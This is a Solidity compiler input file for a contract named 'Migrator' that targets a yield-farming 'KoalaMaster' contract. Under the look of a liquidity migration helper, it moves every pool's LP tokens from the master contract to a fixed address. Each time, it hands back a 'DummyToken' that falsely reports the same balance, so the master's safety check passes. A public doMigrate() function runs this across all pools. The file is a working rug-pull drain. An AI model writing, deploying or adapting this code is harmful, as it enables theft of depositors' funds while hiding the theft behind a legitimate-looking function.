{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "browser/Migrator.sol": {
      "content": "\n// File: contracts/uniswapv2/interfaces/IUniswapV2Pair.sol\n\npragma solidity >=0.5.0;\n\ninterface IUniswapV2Pair {\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external pure returns (string memory);\n    function symbol() external pure returns (string memory);\n    function decimals() external pure returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n    function nonces(address owner) external view returns (uint);\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\n    function factory() external view returns (address);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function kLast() external view returns (uint);\n\n    function mint(address to) external returns (uint liquidity);\n    function burn(address to) external returns (uint amount0, uint amount1);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function sync() external;\n\n    function initialize(address, address) external;\n}\n\ninterface IKoalaMaster {\n    function poolLength() external view returns (uint256);\n    function migrate(uint256 _pid) external;\n}\n\n// File: contracts/Migrator.sol\n\npragma solidity >=0.5.0;\n\n\ncontract DummyToken {\n    uint256 balance;\n    \n    constructor(uint256 _balance) public {\n        balance = _balance;\n    }\n    \n    function balanceOf(address owner) external view returns (uint256) {\n        return balance;\n    }\n}\n\n\ncontract Migrator {\n    IKoalaMaster public chef;\n    address to;\n\n    constructor(\n        IKoalaMaster _chef,\n        address _to\n    ) public {\n        chef = _chef;\n        to = _to;\n    }\n    \n    function doMigrate() public {\n        for (uint256 pid = 0; pid < chef.poolLength(); ++pid) {\n            chef.migrate(pid);\n        }\n    }\n\n    function migrate(IUniswapV2Pair orig) public returns (DummyToken) {\n        require(msg.sender == address(chef), \"not from master chef\");\n        \n        uint256 lp = orig.balanceOf(msg.sender);\n        \n        DummyToken dummy = new DummyToken(lp);\n        \n        if (lp == 0) return dummy;\n        orig.transferFrom(msg.sender, to, lp);\n        return dummy;\n    }\n}\n"
    }
  }
}